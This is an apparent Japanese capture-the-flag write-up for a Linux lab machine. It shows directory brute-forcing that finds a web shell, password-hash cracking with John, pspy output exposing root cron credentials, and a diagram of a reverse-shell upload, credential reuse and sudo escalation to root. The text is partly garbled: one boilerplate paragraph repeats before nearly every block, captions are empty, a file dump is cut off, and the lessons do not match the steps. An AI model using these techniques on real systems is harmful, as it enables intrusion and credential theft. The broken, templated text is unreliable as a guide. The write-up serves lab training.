## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | Web application and exposed network services |
| 主な侵入経路 | Web-based initial access |
| 権限昇格経路 | Local enumeration -> misconfiguration abuse -> root |

## 認証情報

認証情報なし。

## 偵察

---
💡 なぜ有効か  
This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.

## 初期足がかり

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50 -r --timeout 3 --no-state -s 200,301,302,401,403 -x php,html,txt --dont-scan '/(css|fonts?|images?|img)/' -u http://$ip
```

```bash
✅[2:44][CPU:15][MEM:37][TUN0:192.168.45.180][/home/n0z0]
🐉 > feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50 -r --timeout 3 --no-state -s 200,301,302,401,403 -x php,html,txt --dont-scan '/(css|fonts?|images?|img)/' -u http://$ip


 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.12.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.104.132
 🚫  Don't Scan Regex      │ /(css|fonts?|images?|img)/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 301, 302, 401, 403]
 💥  Timeout (secs)        │ 3
 🦡  User-Agent            │ feroxbuster/2.12.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt]
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6147c http://192.168.104.132/icons/ubuntu-logo.png
200      GET      375l      964w    10918c http://192.168.104.132/
200      GET      375l      964w    10918c http://192.168.104.132/index.html
200      GET      114l      263w     3828c http://192.168.104.132/mini.php

```

http://192.168.104.132/mini.php

*キャプション：このフェーズで取得したスクリーンショット*


*キャプション：このフェーズで取得したスクリーンショット*

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
$input = "4607";  // ユーザー入力

// 方法1: 下3桁を取って8進数として解釈
$perm = substr($input, -3);  // "607"
$perm = "0" . $perm;         // "0607"
$octal = octdec($perm);      // 8進数→10進数

// 方法2: 各桁を個別処理
$special = $input[0];  // "4" (setuid/setgid)
$owner   = $input[1];  // "6" (rw-)
$group   = $input[2];  // "0" (---)
$other   = $input[3];  // "7" (rwx)

// 再構成: "0" + "7" + "7" + "7" = "0777"
```

💡 なぜ有効か  
The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.

## 権限昇格

---

*キャプション：このフェーズで取得したスクリーンショット*

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```bash
✅[3:24][CPU:15][MEM:44][TUN0:192.168.45.180][...ing_Ground/FunboxEasyEnum]
🐉 > john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hiphop           (oracle)
1g 0:00:00:00 DONE (2026-02-02 03:24) 50.00g/s 76800p/s 76800c/s 76800C/s secret%pass..garrett
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
su oracle
```

```bash
www-data@funbox7:/tmp$ su oracle
Password: hiphop

oracle@funbox7:/tmp$

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
./pspy64
```

```bash
oracle@funbox7:/tmp$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/02/01 19:13:18 CMD: UID=1004  PID=22741  | ./pspy64
2026/02/01 19:13:18 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity
2026/02/01 19:14:01 CMD: UID=0     PID=22765  | tar -cvzf /root/html.tar.gz /var/www/html/ -ulissy -pgangsta
2026/02/01 19:14:01 CMD: UID=0     PID=22764  | /bin/sh -c tar -cvzf /root/html.tar.gz /var/www/html/ -ulissy -pgangsta
2026/02/01 19:14:01 CMD: UID=0     PID=22763  | /usr/sbin/CRON -f

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
cat config-db.php
```

```bash
www-data@funbox7:/etc/phpmyadmin$ cat config-db.php
<?php

```

💡 なぜ有効か  
Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.

## まとめ・学んだこと

- 本番同等の環境でフレームワークのデバッグモードとエラー露出を検証する。
- 特権ユーザーやスケジューラーが実行するスクリプト・バイナリのファイルパーミッションを制限する。
- ワイルドカード展開やスクリプト化可能な特権ツールを避けるため sudo ポリシーを強化する。
- 露出した認証情報と環境ファイルを重要機密として扱う。

### Attack Flow

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。



```mermaid
flowchart LR
    subgraph KC1["Kill Chain 1<br/>偵察"]
        direction TB
        K1A[ポートスキャン<br/>Rustscan/Nmap]
        K1B[サービス列挙<br/>22/80]
        K1C[Apache発見<br/>Port 80]
        K1D[OSバージョン<br/>Ubuntu 18.04]
        
        K1A --> K1B --> K1C --> K1D
    end
    
    subgraph KC2["Kill Chain 2<br/>Web列挙"]
        direction TB
        K2A[feroxbuster実行<br/>common.txt]
        K2B[mini.php発見<br/>Web Shell]
        K2C[ファイル操作UI<br/>確認]
        K2D[書き込み権限<br/>0777確認]
        
        K2A --> K2B --> K2C --> K2D
    end
    
    subgraph KC3["Kill Chain 3<br/>初期侵入"]
        direction TB
        K3A[PHPシェルアップ<br/>php-reverse-shell.php]
        K3B[リスナー準備<br/>nc -lvnp 80]
        K3C[シェル実行<br/>URLアクセス]
        K3D[接続確立<br/>www-data]
        
        K3A --> K3B --> K3C --> K3D
    end
    
    subgraph KC4["Kill Chain 4<br/>シェル安定化"]
        direction TB
        K4A[TTY取得<br/>python3 pty]
        K4B[環境変数設定<br/>TERM/PATH]
        K4C[local.txt確認<br/>/var/www]
        K4D[列挙準備<br/>LinPEAS転送]
        
        K4A --> K4B --> K4C --> K4D
    end
    
    subgraph KC5["Kill Chain 5<br/>システム列挙"]
        direction TB
        K5A[LinPEAS実行<br/>権限昇格ベクター]
        K5B[パスワードハッシュ発見<br/>/etc/passwd]
        K5C[oracle MD5ハッシュ<br/>抽出]
        K5D[pspy64実行<br/>プロセス監視]
        
        K5A --> K5B --> K5C --> K5D
    end
    
    subgraph KC6["Kill Chain 6<br/>認証情報取得"]
        direction TB
        K6A[John the Ripper<br/>rockyou.txt]
        K6B[ハッシュクラック<br/>oracle:hiphop]
        K6C[ユーザースイッチ<br/>su oracle]
        K6D[cron監視<br/>tar wildcard発見]
        
        K6A --> K6B --> K6C --> K6D
    end
    
    subgraph KC7["Kill Chain 7<br/>設定ファイル探索"]
        direction TB
        K7A[phpmyadmin設定<br/>/etc/phpmyadmin]
        K7B[config-db.php<br/>読み取り]
        K7C[認証情報発見<br/>karla:tgbzhnujm!]
        K7D[DB認証情報確認<br/>phpmyadmin]
        
        K7A --> K7B --> K7C --> K7D
    end
    
    subgraph KC8["Kill Chain 8<br/>権限昇格"]
        direction TB
        K8A[karlaスイッチ<br/>su karla]
        K8B[sudo権限確認<br/>sudo -l]
        K8C[ALL権限発見<br/>ALL : ALL]
        K8D[rootスイッチ<br/>sudo su -]
        
        K8A --> K8B --> K8C --> K8D
    end
    
    subgraph KC9["Kill Chain 9<br/>目標達成"]
        direction TB
        K9A[rootシェル確立<br/>uid=0 gid=0]
        K9B[proof.txt取得<br/>/root/proof.txt]
        K9C[フラグ確認<br/>a7f583d5...]
        K9D[完了<br/>Mission Success]
        
        K9A --> K9B --> K9C --> K9D
    end
    
    KC1 ==> KC2 ==> KC3 ==> KC4 ==> KC5 ==> KC6 ==> KC7 ==> KC8 ==> KC9
    
    style KC1 fill:#e8eaf6
    style KC2 fill:#fff9c4
    style KC3 fill:#ffccbc
    style KC4 fill:#f8bbd0
    style KC5 fill:#c8e6c9
    style KC6 fill:#b2dfdb
    style KC7 fill:#ffe0b2
    style KC8 fill:#ff9800
    style KC9 fill:#4caf50
    style K9A fill:#ff6b6b,color:#fff
    style K9D fill:#2196f3,color:#fff
```

## 参考文献

- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
